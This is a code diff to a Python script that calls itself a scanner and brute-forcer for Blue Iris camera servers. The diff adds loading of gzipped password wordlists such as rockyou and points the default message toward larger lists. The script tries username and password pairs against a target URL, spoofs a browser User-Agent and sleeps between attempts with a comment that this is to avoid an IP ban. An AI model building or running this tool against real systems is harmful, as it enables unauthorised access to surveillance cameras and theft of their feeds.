@@ -4,15 +4,29 @@ import hashlib
 import argparse
 import sys
 import time
+import gzip
+import os
 
 def md5(text):
     return hashlib.md5(text.encode('utf-8')).hexdigest()
+
+def load_wordlist(path):
+    if not os.path.exists(path):
+        print(f"[-] Wordlist not found: {path}")
+        sys.exit(1)
+    if path.endswith('.gz'):
+        print(f"[+] Loading gzipped wordlist: {path}")
+        with gzip.open(path, 'rt', encoding='utf-8', errors='ignore') as f:
+            return [line.strip() for line in f if line.strip()]
+    else:
+        with open(path) as f:
+            return [line.strip() for line in f if line.strip()]
 
 def main():
     parser = argparse.ArgumentParser(description="Blue Iris Modern JSON Scanner & Brute-Forcer (c0nfigur3/BI-scanner)")
     parser.add_argument("-H", "--host", required=True, help="Target URL (e.g. http://REDACTED:81)")
     parser.add_argument("-u", "--users", default="users.txt", help="Username list (default: users.txt)")
-    parser.add_argument("-p", "--passwords", default="passwords.txt", help="Password list (default: passwords.txt)")
+    parser.add_argument("-p", "--passwords", default="passwords.txt", help="Password list — supports .txt or .gz (e.g. /usr/share/wordlists/rockyou.txt.gz)")
     parser.add_argument("-d", "--delay", type=int, default=2, help="Delay between attempts in seconds (default: 2)")
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     args = parser.parse_args()
@@ -40,14 +54,9 @@ def main():
         users = ["admin"]
         print("[!] users.txt not found — using default 'admin'")
 
-    try:
-        with open(args.passwords) as f:
-            passwords = [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print("[-] passwords.txt not found. Create it first.")
-        sys.exit(1)
+    passwords = load_wordlist(args.passwords)
 
-    print(f"[+] Brute forcing {len(users)} user(s) × {len(passwords)} password(s)...\n")
+    print(f"[+] Brute forcing {len(users)} user(s) × {len(passwords):,} password(s)...\n")
 
     session = requests.Session()
     session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
@@ -87,7 +96,7 @@ def main():
 
             time.sleep(args.delay)  # Prevent IP ban
 
-    print("[-] No luck with current wordlists. Expand passwords.txt and try again.")
+    print("[-] No luck with current wordlists. Try a larger one or expand users.txt.")
 
 if __name__ == "__main__":
     main()
